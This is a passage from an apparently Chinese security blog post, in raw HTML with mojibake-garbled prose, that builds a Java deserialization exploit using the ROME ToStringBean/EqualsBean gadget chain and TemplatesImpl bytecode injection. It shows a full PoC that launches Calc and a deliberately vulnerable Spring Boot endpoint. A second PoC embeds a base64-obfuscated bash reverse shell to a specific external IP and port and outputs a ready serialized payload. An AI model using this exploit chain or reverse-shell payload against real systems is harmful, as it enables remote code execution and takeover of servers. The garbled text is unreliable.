title="POCä¼˜åŒ–"></a>POCä¼˜åŒ–</h3><p>åˆ©ç”¨é“¾åœ¨ç»™HashMapèµ‹å€¼çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨<code>put()</code>å‡½æ•°ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ä¸€æ¬¡<code>key.hashcode()</code>è¿›è€Œåœ¨ååºåˆ—åŒ–ä¹‹å‰å°±æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡åå°„ä¿®æ”¹HashMapçš„<code>key</code>å€¼ä»è€Œé¿å…åºåˆ—åŒ–çš„æ—¶å€™å°±æ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unseralize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192253056.png" alt="image-20221116192253056"></p><p>å¯¹æœ€åä¸€éƒ¨åˆ†pocè¿›è¡Œä¸€ä¸ªè§£è¯»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.ToStringBean()çš„å‚æ•°ä¸ºä»€ä¹ˆè¦ç”¨Templates.class?</span><br><span class="line">anser:å› ä¸ºTemplatesç±»åªæœ‰ä¸€ä¸ªgetter,TemplatesImplç±»å«æœ‰å¤šä¸ªgetterï¼Œä½¿ç”¨TemplatesImpl.classï¼Œåˆ™æœ‰å¯èƒ½æ— æ³•è°ƒç”¨åˆ°getOutputProperties()</span><br><span class="line">(åœ¨è¿™é‡Œä¸çŸ¥ä¸ºä½•æˆ‘ä½¿ç”¨TemplatesImpl.classæ— æ³•æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œå¸Œæœ›æœ‰å¸ˆå‚…å¯ä»¥æŒ‡æ•™ä¸€ä¸‹~)</span><br><span class="line"></span><br><span class="line">2.å…³äºHashMap.put()</span><br><span class="line">anser:å› ä¸ºåœ¨è°ƒç”¨HashMap.put()æ—¶ä¼šè°ƒç”¨åˆ°hashæ–¹æ³•è¿›è€Œè°ƒç”¨åˆ°key.hashcode()ï¼Œè¿›è€Œå¯¼è‡´æå‰æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥éœ€è¦å…ˆputä¸€äº›æ— ç”¨çš„å€¼è¿›å»ï¼Œç„¶ååˆ©ç”¨åå°„åœ¨åºåˆ—åŒ–ä¹‹åä¿®æ”¹é“¾è¡¨ä¸­keyçš„å€¼</span><br></pre></td></tr></table></figure><p>è™šæ‹Ÿæœºä¸Šèµ·ä¸ªsrpingbootï¼Œåå¼¹ä¸ªshell</p><p>å†™ä¸ªå…¥å£æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.cor.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.cor.Tools;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/&quot; &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="keyword">final</span> HttpServletRequest request, <span class="keyword">final</span> HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/test&quot; &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> <span class="keyword">final</span> String data, <span class="keyword">final</span> Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjcwLjIyMS4yMDYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> poc.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> 